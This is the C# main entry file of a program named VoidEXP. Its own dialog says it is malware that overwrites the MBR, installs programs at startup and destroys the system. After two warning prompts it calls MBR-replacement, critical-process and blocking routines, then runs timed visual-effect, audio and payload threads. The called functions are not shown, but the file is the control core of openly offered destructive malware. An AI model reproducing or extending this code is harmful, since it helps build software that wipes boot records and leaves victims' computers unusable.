using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using static VoidEXP.GDI;
using static VoidEXP.Bytebeat;
using static VoidEXP.Threads;
using static VoidEXP.SystemPayloads;
using static Vanara.PInvoke.Kernel32;

namespace VoidEXP
{
    class Main_
    {
        public static int Main()
        {
            if (MessageBox.Show("This is malware that will replace the MBR, install programs at startup, and destroy your system. Do you really want to run it?", "!-Warning-!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes) {
                if (MessageBox.Show("This malware will render your system unusable, so do you really want to run it?", "!-Warning-!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    MBR();
                    SetCritical();
                    Block();
                    abustantanstart();
                    ds.Start();
                    Sleep(1000 * 5);
                    b1.Start();
                    Sleep(1000 * 18);
                    g1.Start();
                    Sleep(1000 * 19);
                    p1.Start();
                    Sleep(1000 * 19);
                    g2.Start();
                    Sleep(1000 * 21);
                    g3.Start();
                    Sleep(1000 * 23);
                    GC.Collect();
                    g3.Abort();
                    g2.Abort();
                    p1.Abort();
                    b1.Abort();
                    Sleep(50);
                    g3 = null;
                    g2 = null;
                    p1 = null;
                    b1 = null;
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    p2.Start();
                    g5.Start();
                    g4.Start();
                    b2.Start();
                    Sleep(1000 * 21);
                    b2.Abort();
                    g4.Abort();
                    p2.Abort();
                    p2 = null;
                    g4 = null;
                    b2 = null;
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    b3.Start();
                    g6.Start();
                    Sleep(1000 * 22);
                    b3.Abort();
                    g6.Abort();
                    g1.Abort();
                    b3 = null;
                    g6 = null;
                    g1 = null;
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    b4.Start();
                    r.Start();
                    p.Start();
                    g7.Start();
                    Sleep(1000 * 25);
                    Environment.Exit(0);
                }
                else
                {
                    Environment.Exit(0);
                }
            }
            else
            {
                Environment.Exit(0);
            }
            return 0;

        }
    }
}
